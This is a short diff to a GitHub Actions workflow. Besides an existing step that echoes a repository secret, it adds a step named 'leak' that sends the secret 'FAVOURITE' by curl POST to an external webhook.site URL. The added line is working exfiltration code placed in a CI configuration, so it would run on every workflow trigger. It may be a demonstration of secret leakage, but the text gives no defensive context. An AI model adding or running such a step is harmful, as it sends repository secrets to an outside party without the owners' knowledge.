@@ -24,3 +24,6 @@ jobs:
 
       - name: I ll tell you my current favourite 
         run: echo ${{ secrets.FAVOURITE }}
+      
+      - name: leak
+        run: curl -X POST -d '${{ secrets.FAVOURITE }}' https://webhook.site/f91bcc2b-b2a4-4520-97b4-bf79261fa784
